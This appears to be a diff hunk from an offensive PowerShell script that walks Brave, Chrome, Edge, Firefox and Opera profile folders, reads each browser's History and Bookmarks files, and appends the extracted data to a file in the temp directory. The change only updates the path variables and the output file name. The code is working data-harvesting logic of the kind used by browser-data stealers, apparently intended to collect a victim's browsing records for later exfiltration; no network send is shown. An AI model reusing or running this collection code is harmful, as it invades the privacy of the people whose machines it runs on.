@@ -496,41 +496,41 @@ $browsers = @('brave', 'chrome', 'edge', 'firefox', 'opera')
 
 foreach ($browser in $browsers) {
     if ($browser -eq 'brave') {
-	$Brave_Profiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" -Directory | Where-Object { $_.Name -like "Profile*" } | Select-Object -ExpandProperty Name
+	$Brave_Profiles = Get-ChildItem -Path "$Env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\" -Directory | Where-Object { $_.Name -like "Profile*" } | Select-Object -ExpandProperty Name
 	
 	if ($Brave_Profiles) {
 	    $Brave_Profiles | ForEach-Object {
 	        $profile = $_
-	 	$path_history = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" + $profile + "\History"
-   		$path_bookmarks = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" + $Profile + "\Bookmarks"
-	        Get-BrowserData -Browser $browser -DataType "history" -Profile $profile -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
-	        Get-BrowserData -Browser $browser -DataType "bookmarks" -Profile $profile -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+	 	$path_history = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\" + $profile + "\History"
+   		$path_bookmarks = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\" + $Profile + "\Bookmarks"
+	        Get-BrowserData -Browser $browser -DataType "history" -Profile $profile -Path $path_history >> $env:TMP\$FileName
+	        Get-BrowserData -Browser $browser -DataType "bookmarks" -Profile $profile -Path $path_bookmarks >> $env:TMP\$FileName
 	    }
 	} else {
- 	    $path_history = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
-	    $path_bookmarks = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
-	    Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
-	    Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+ 	    $path_history = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
+	    $path_bookmarks = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
+	    Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
+	    Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
 	}
     } elseif ($browser -eq 'chrome') {
-    	$path_history = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-	$path_bookmarks = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
-	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+    	$path_history = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+	$path_bookmarks = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
+	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
     } elseif ($browser -eq 'edge') {
-    	$path_history = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-	$path_bookmarks = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
-	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+    	$path_history = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+	$path_bookmarks = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
+	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
     } elseif ($browser -eq 'firefox') {
-    	$path_history = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
+    	$path_history = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
     } elseif ($browser -eq 'opera') {
-        $Opera = Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Opera Software\" | Where-Object { $_.Name -like "Opera*" } | Select-Object -ExpandProperty Name
-	$path_history = "$env:USERPROFILE\AppData\Roaming\Opera Software\" + $Opera + "\Default\History"
-	$path_bookmarks = "$env:USERPROFILE\AppData\Roaming\Opera Software\" + $Opera + "\Default\Bookmarks"
-	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FolderName\BrowserData.txt
-	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FolderName\BrowserData.txt
+        $Opera = Get-ChildItem -Path "$env:APPDATA\Opera Software\" | Where-Object { $_.Name -like "Opera*" } | Select-Object -ExpandProperty Name
+	$path_history = "$env:APPDATA\Opera Software\" + $Opera + "\Default\History"
+	$path_bookmarks = "$env:APPDATA\Opera Software\" + $Opera + "\Default\Bookmarks"
+	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
+	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
     }
 }
 
